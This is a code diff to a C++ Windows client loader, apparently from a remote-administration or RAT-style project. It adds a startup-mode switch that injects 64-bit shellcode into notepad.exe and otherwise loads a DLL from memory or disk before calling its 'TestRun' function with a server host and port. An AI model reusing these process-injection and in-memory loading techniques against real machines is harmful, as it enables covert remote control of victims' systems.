@@ -30,9 +30,9 @@ IsExit bExit = NULL;
 BOOL status = 0;
 
 #ifdef _DEBUG
-CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL };
+CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION, 0, Startup_InjSC };
 #else
-CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_MEMDLL };
+CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION, 0, Startup_InjSC };
 #endif
 
 //提升权限
@@ -275,25 +275,33 @@ int main(int argc, const char *argv[])
 	status = 0;
 	SetConsoleCtrlHandler(&callback, TRUE);
 	
-	// Try to inject shell code to `notepad.exe`
-	// If failed then run memory DLL
-	ShellcodeInj inj;
-	int pid = 0;
-	do{
-		if (sizeof(void*) == 4) // Shell code is 64bit
-			break;
-		if (!(pid = inj.InjectProcess(nullptr))) {
-			break;
-		}
-		HANDLE hProcess = OpenProcess(SYNCHRONIZE, FALSE, pid);
-		if (hProcess == NULL) {
-			break;
-		}
-		Mprintf("Inject process [%d] succeed.\n", pid);
-		DWORD waitResult = WaitForSingleObject(hProcess, INFINITE);
-		CloseHandle(hProcess);
-		Mprintf("Process [%d] is finished.\n", pid);
-	} while (pid);
+	// 此 Shell code 连接本机6543端口，注入到记事本
+	if (g_ConnectAddress.iStartup == Startup_InjSC)
+	{
+		// Try to inject shell code to `notepad.exe`
+		// If failed then run memory DLL
+		ShellcodeInj inj;
+		int pid = 0;
+		do {
+			if (sizeof(void*) == 4) // Shell code is 64bit
+				break;
+			if (!(pid = inj.InjectProcess(nullptr))) {
+				break;
+			}
+			HANDLE hProcess = OpenProcess(SYNCHRONIZE, FALSE, pid);
+			if (hProcess == NULL) {
+				break;
+			}
+			Mprintf("Inject process [%d] succeed.\n", pid);
+			DWORD waitResult = WaitForSingleObject(hProcess, INFINITE);
+			CloseHandle(hProcess);
+			Mprintf("Process [%d] is finished.\n", pid);
+		} while (pid);
+	}
+
+	if (g_ConnectAddress.iStartup == Startup_InjSC) {
+		g_ConnectAddress.iStartup = Startup_MEMDLL;
+	}
 
 	do {
 		BOOL ret = Run(argc > 1 ? argv[1] : (strlen(g_ConnectAddress.ServerIP()) == 0 ? "127.0.0.1" : g_ConnectAddress.ServerIP()),
@@ -346,7 +354,20 @@ BOOL Run(const char* argv1, int argv2) {
 			Mprintf("Using new file: %s\n", newFile.c_str());
 		}
 	}
-	DllRunner* runner = g_ConnectAddress.iType ? (DllRunner*) new MemoryDllRunner : new DefaultDllRunner;
+	DllRunner* runner = nullptr;
+	switch (g_ConnectAddress.iStartup)
+	{
+	case Startup_DLL:
+		runner = new DefaultDllRunner;
+		break;
+	case Startup_MEMDLL:
+		runner = new MemoryDllRunner;
+		break;
+	default:
+		ExitProcess(-1);
+		break;
+	}
+
 	void* hDll = runner->LoadLibraryA(path);
 	typedef void (*TestRun)(char* strHost, int nPort);
 	TestRun run = hDll ? TestRun(runner->GetProcAddress(hDll, "TestRun")) : NULL;
